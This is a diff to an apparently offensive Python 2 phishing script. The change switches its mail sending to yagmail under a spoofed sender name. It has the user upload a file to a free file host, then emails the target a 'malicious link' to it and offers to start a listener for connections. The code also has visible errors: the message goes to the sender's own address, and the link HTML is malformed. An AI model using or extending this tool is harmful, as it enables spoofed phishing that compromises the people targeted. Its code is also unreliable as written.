@@ -9,6 +9,7 @@
 #
 ############################################################
 import socket
+import yagmail
 import smtplib
 import ConfigParser
 import mimetypes
@@ -20,7 +21,7 @@ from email.utils import COMMASPACE,formatdate
 import time
 import os
 from lazyme.string import color_print
-
+import string
 
 #
 # Prints a banner.
@@ -50,25 +51,27 @@ def setup ():
 
 	# Setup the config file
 	global targetName
+	global targetEmail
+	global spoofName
 	global email
 	global password
-	global target
 	global subject
-	global debuglevel
+	global debug
 	global message
 
 	configParser = ConfigParser.RawConfigParser()	
 	configParser.read('config')
 	targetName = configParser.get('Config', 'targetName')
-	email = configParser.get('Config', 'email')
+	targetEmail = configParser.get('Config', 'targetEmail')
+	spoofName  = configParser.get('Config', 'spoofName')
+	email    = configParser.get('Config', 'email')
 	password = configParser.get('Config', 'password')
-	target = configParser.get('Config', 'target')
 	subject = configParser.get('Config', 'subject')
-	debuglevel = configParser.get('Config', 'debuglevel')
+	debug = configParser.get('Config', 'debug')
 	message = configParser.get('Config', 'message')
 
 	# Validate the input.
-	if (email == 'None' or password == 'None' or target == 'None' or targetName == 'None'):
+	if (spoofName == 'None' or email == 'None' or password == 'None' or targetEmail == 'None' or targetName == 'None'):
 		color_print('[!] Please setup your config file.', color='red')	
 		return
 
@@ -85,30 +88,22 @@ def setup ():
 def connect():
 
 	# get the smtp server via user input.
-	color_print("[ Press enter twice to use default settings to send via gmail ]", color='blue')
-	server = raw_input('What is the smtp server you want to connect to (eg smtp.gmail.com): ')
-	if server == '':
-		server = 'smtp.gmail.com'
-	try:
-	
-		port   = int(raw_input('What is the port number: '))
-	except ValueError:
-		port = 25
-
-	color_print(server, color='yellow')
-	color_print(str(port), color='yellow')
+	color_print("[+] Getting everything ready.", color='blue')
 		
 	# attempt to connect to the stmp server.
 	try:
-		# Connected to server.
-		color_print("\n[+] Connecting to " + server, color='blue')
+		# Connecting to the server.
 		try:
-			smtp = smtplib.SMTP()
-			smtp.connect(host=server, port=port)
-			smtp.ehlo()
-			smtp.starttls()
-			smtp.ehlo()
-			color_print("[+] Connected.", color='green')
+			# Create the yagmail object
+			yag = yagmail.SMTP({email:spoofName}, password)
+
+			try:
+				# Send the mail.
+				sendEmail(yag, email, targetEmail, spoofName)
+			except KeyboardInterrupt:
+				color_print("Thanks, Happy hacking", color='blue')
+		
+			#color_print("[+] Connected.", color='green')
 
 		except smtplib.SMTPServerDisconnected:
 			color_print("[!] Connection unexpectedly closed, \n[!] you might be behind a firewall! Try using a VPN.", color='red')
@@ -118,74 +113,40 @@ def connect():
 		# Failed to connect!!.
 		color_print("\n[!] Could not connect to the server.", color='red')
 		return
+def sendEmail (server, fromAddr, toAddr, spoofName):
 
-	try:
-		# login and send the payload.
-		smtp.debuglevel = debuglevel
-		smtp.login(email, password)
-		color_print("\n Authentication Successfull!.", color='green')
-
-		# Send the email.
-		sendMail(smtp)
-
-
-	except smtplib.SMTPAuthenticationError:
-		color_print("\nFaild to login try turning on lesssecureapps from 'https://myaccount.google.com/lesssecureapps'", color='red')
-		return	
-
-
-def sendMail (server):
-
-	raw_input("[ Upload it to drop box and press enter ]")
-	link = raw_input("Paste the link to your file: ")		
+	# Tell the user to upload there file.
+	color_print("Upload it to a free file hosting website: https://nofile.io/", color='yellow')
+	time.sleep(2)
+	link = raw_input("\nPaste the link to your file: \n")		
 	while len(link) == 0: link = raw_input("Paste the link to your file: ")
 
 
-	color_print("[+] Sending email to " + email, color='blue')
-
-	msg = MIMEMultipart('alternative')	
-	msg['From'] = email
-	msg['To'] = target
-	msg['Date'] = formatdate(localtime = True)
-	msg['Subject'] = subject
-
-	# Define the html message.
-	text = """
-		<html>
-		<title>
-		Very funny
-		</title>
-		<p>
-		Hi """ + targetName + """,
-		<br></br>
-		""" + message + """
-		</p>
-		<a href=""" + link +""">""" + link + """</a>
-		<br>
-		</br>
-		</html>
-		"""
-	html = MIMEText(text, 'html')
-	msg.attach(html)
-	
+	# Print out a thew important messages.
+	color_print("[+] Sending email to " + toAddr, color='blue')
+	time.sleep(2)
+	color_print("[+] Spoofing email " + spoofName, color='yellow')
+	time.sleep(2)
 	color_print("[*] Sending malicious link..", color='yellow')
 	time.sleep(1)
-	server.sendmail(email, target, msg.as_string())
+
+	# Create the specially crafted link.
+	html = '<a href="'+link+'">'+link+'/a>'
+
+	# Send the message.
+	server.send(fromAddr, subject, [message, html])
 
 	# Do you want to listen for any connections.
 	listen = raw_input('Do you want to start up a listener: [Y/N]: ')
 	if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
 		color_print("[+] Starting a listener", color='blue')
 
-		server.quit()
 		# Listen for a connection
 		listenForConnections()
 	else:
-		server.quit()
 		color_print("Thanks, Happy hacking", color='blue')
 		return	
 	color_print("\n[*] Email sent", color='green')
-
 #
 # Listen for a connection
 #		
